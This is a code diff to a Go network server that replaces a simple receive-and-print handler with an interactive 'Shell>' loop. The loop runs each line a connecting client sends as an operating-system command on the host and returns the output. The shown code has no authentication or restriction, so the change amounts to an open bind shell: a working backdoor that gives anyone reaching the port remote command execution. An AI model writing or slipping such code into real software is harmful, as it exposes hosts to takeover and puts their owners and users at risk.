@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"runtime"
 	"strings"
 )
@@ -77,15 +78,57 @@ func handleConnection(conn net.Conn) {
 	// Close the connection when done
 	defer conn.Close()
 
-	// Read incoming data
-	buf := make([]byte, 1024)
+	// Send the initial prompt
+	conn.Write([]byte("Welcome to the server! Type 'exit' to disconnect.\n"))
+	conn.Write([]byte("Shell> "))
+
+	// Initialize a reader to read from the connection
+	reader := bufio.NewReader(conn)
+
+	// Loop to handle command input from the client
 	for {
-		n, err := conn.Read(buf)
+		// Read command input from the client
+		command, err := reader.ReadString('\n')
 		if err != nil {
-			fmt.Printf("[!] Error reading from connection: %s\n", err)
+			fmt.Printf("[!] Error reading command: %s\n", err)
 			break
 		}
-		// Print the received data to the console
-		fmt.Printf("[*] Received: %s\n", string(buf[:n]))
+
+		// Trim newline from the command
+		command = strings.TrimSpace(command)
+
+		// Exit the shell if the client types "exit"
+		if command == "exit" {
+			conn.Write([]byte("Goodbye!\n"))
+			break
+		}
+
+		// Execute the command on the server
+		output, err := executeCommand(command)
+		if err != nil {
+			conn.Write([]byte(fmt.Sprintf("[!] Error: %s\n", err)))
+		} else {
+			conn.Write([]byte(output + "\n"))
+		}
+
+		// Send the prompt again
+		conn.Write([]byte("Shell> "))
 	}
+}
+
+// executeCommand runs a command on the server and returns its output
+func executeCommand(command string) (string, error) {
+	// Split the command into the executable and its arguments
+	cmdParts := strings.Fields(command)
+	if len(cmdParts) == 0 {
+		return "", fmt.Errorf("no command provided")
+	}
+
+	cmd := exec.Command(cmdParts[0], cmdParts[1:]...)
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("failed to execute command: %s", err)
+	}
+
+	return string(output), nil
 }
